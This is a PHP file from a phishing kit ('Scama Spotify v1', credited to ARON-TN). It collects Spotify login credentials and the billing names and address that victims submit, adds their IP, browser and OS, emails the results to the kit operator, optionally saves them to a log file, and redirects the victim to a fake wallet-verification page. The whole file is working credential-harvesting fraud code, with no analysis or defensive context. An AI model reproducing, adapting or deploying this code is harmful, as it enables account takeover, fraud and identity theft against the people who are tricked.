<?php
/*
 $$$$$$\  $$$$$$$\   $$$$$$\  $$\   $$\      $$$$$$$$\ $$\   $$\ 
$$  __$$\ $$  __$$\ $$  __$$\ $$$\  $$ |     \__$$  __|$$$\  $$ |
$$ /  $$ |$$ |  $$ |$$ /  $$ |$$$$\ $$ |        $$ |   $$$$\ $$ |
$$$$$$$$ |$$$$$$$  |$$ |  $$ |$$ $$\$$ |$$$$$$\ $$ |   $$ $$\$$ |
$$  __$$ |$$  __$$< $$ |  $$ |$$ \$$$$ |\______|$$ |   $$ \$$$$ |
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |        $$ |   $$ |\$$$ |
$$ |  $$ |$$ |  $$ | $$$$$$  |$$ | \$$ |        $$ |   $$ | \$$ |
\__|  \__|\__|  \__| \______/ \__|  \__|        \__|   \__|  \__|
                                                                 
#==========================================#
#             Scama Spotify v1             #
#       facebook: fb.com/amyr.gov.tn       #
#==========================================#

 $$$$$$\   $$$$$$\    $$\   $$$$$$\  
$$  __$$\ $$$ __$$\ $$$$ | $$  __$$\ 
\__/  $$ |$$$$\ $$ |\_$$ | $$ /  $$ |
 $$$$$$  |$$\$$\$$ |  $$ | \$$$$$$$ |
$$  ____/ $$ \$$$$ |  $$ |  \____$$ |
$$ |      $$ |\$$$ |  $$ | $$\   $$ |
$$$$$$$$\ \$$$$$$  /$$$$$$\\$$$$$$  |
\________| \______/ \______|\______/ 
*/       
session_start();
error_reporting(0);
$TIME_DATE = date('H:i:s d/m/Y');
include('../../../../Email.php');
include('../../functions/get_browser.php');
include('../../functions/get_ip.php');
if(!empty($_POST['name1'])){$_SESSION['_name1_'] = $_POST['name1'];}
if(!empty($_POST['name2'])){$_SESSION['_name2_'] = $_POST['name2'];}
if(!empty($_POST['AddressLine1'])){$_SESSION['_address1_'] = $_POST['AddressLine1'];}
if(!empty($_POST['AddressLine2'])){$_SESSION['_address2_'] = $_POST['AddressLine2'];}
if(!empty($_POST['city'])){$_SESSION['_city_'] = $_POST['city'];}
if(!empty($_POST['state'])){$_SESSION['_state_'] = $_POST['state'];}
if(!empty($_POST['zipCode'])){$_SESSION['_zipCode_'] = $_POST['zipCode'];}
$aron_message="<html>
        <head><meta charset=\"UTF-8\"></head>
        <div style='font-size:13px;font-family:monospace'>";
$aron_message.="<b><font color='#cc1414'>✪</font> DEAR, <font color='#cc1414'>".$aronxname."</font> THIS IS YOUR LOGIN RESULT ENJOY !</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[EMAIL]</font></b>           :<b>".$_SESSION['_login_email_']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[PASSWORD]</font></b>        :<b>".$_SESSION['_login_password_']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[First Name]</font></b>        :<b>".$_SESSION['_name1_']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Last Name]</font></b>        :<b>".$_SESSION['_name2_']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Address line I]</font></b>        :<b>".$_SESSION['_address1_']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Address line II]</font></b>        :<b>".$_SESSION['_address2_']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Country Name]</font></b>        :<b>".$_SESSION['_LOOKUP_COUNTRY_']."-".$_SESSION['_LOOKUP_REGIONS_']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Town/City]</font></b>        :<b>".$_SESSION['_city_']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Province/State]</font></b>        :<b>".$_SESSION['_state_']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Postal/Zip Code]</font></b>        :<b>".$_SESSION['_zipCode_']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[IP]</font></b>              :<a href='https://db-ip.com/".$_SESSION['_ip_']."' target='_blank'>".$_SESSION['_ip_']." (Click for more information)</a> <br>";
$aron_message.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[BROWSER & OS]</font></b>    : <b>".ARON_Browser($_SERVER['HTTP_USER_AGENT'])." On ".ARON_OS($_SERVER['HTTP_USER_AGENT'])."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[TIME]</font></b>            : <b>".date('l jS \of F Y h:i:s A')."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✪</font> Coded By ARON-TN</div>\n";
$aron_subject =  "Billing (".$_SESSION['_login_email_'].")(".$_SESSION['_forlogin_'].")";
$aron_headers  = "From: ARON-TN <no_reply@aron.tn>\n";
$aron_headers .= "MIME-Version: 1.0\r\n";
$aron_headers .= "Content-Type: text/html; charset=ISO-8859-1\n";
@mail($aronxmail, $aron_subject, $aron_message, $aron_headers);
if ($aronxsave=='on') {
    $save=fopen("../../../../ARONxADMIN/Billing.html","a+");
    fwrite($save,$aron_message);
    fclose($save);
}
HEADER("Location: ../wallet/?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?>